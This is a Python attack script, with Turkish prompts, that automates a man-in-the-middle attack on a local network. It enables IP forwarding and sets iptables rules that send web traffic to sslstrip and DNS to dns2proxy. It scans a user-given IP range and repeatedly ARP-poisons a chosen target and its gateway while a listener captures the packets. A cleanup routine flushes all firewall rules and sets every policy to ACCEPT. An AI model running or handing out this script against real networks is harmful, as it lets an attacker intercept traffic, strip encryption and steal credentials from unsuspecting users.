import Scanner
import Listener
import ArpPois0n

import os,time
from threading import Thread

def Hazirlan():

    print("IP tabloları ayarlanıyor ve ip yonlendirme aciliyor...")

    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000")
    os.system("iptables -t nat -A PREROUTING -p udp --destination-port 53 -j REDIRECT --to-port 53")

def Temizle():

    print("IP tabloları temizleniyor ve ip yonlendirme kapatiliyor...")

    os.system("iptables -F")
    os.system("iptables -X")
    os.system("iptables -t nat -F")
    os.system("iptables -t mangle -F")
    os.system("iptables -t mangle -X")
    os.system("iptables -P INPUT ACCEPT")
    os.system("iptables -P FORWARD ACCEPT")
    os.system("iptables -P OUTPUT ACCEPT")

    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")

def EkAraclar():
    
    os.system("cd /root/Masaüstü/Tools/dns2proxy")
    os.system("xterm -hold -title \"sslstrip\" -bg \"#000000\" -fg \"#1ec503\" -geometry 109x20-0-500 -e sslstrip -l 10000 &")
    os.system("xterm -hold -title \"dns2proxy\" -bg \"#000000\" -fg \"#1ec503\" -geometry 109x20-0-0 -e python /root/Masaüstü/Tools/dns2proxy1/dns2proxy.py &")


def NetworkSniff():

    sayac = 0

    ip = input("İp aralığını giriniz : ")

    hedef_bilgileri = Scanner.NetworkTara(ip)

    HedefIp = hedef_bilgileri[0]
    HedefMac = hedef_bilgileri[1]
    GateWayIp = hedef_bilgileri[2]
    GateWayMac = hedef_bilgileri[3]

    try:
        while True:
            ArpPois0n.arp_zehirle(HedefIp,GateWayIp,HedefMac)
            ArpPois0n.arp_zehirle(GateWayIp,HedefIp,GateWayMac)

            sayac += 2

            print("\rGiden Paketler " + str(sayac),end="")

            time.sleep(3)

    except KeyboardInterrupt:

        print("CTRL + C Algilandi programdan cikiliyor!")
        Temizle()
        exit(0)

Temizle()
Hazirlan()

try:
    

    Thread(target = NetworkSniff).start()
    Thread(target = Listener.listen_packets).start()
    Thread(target = EkAraclar).start()

except KeyboardInterrupt:

    print("CTRL + C Algilandi programdan cikiliyor!")
    Temizle()
    exit(0)
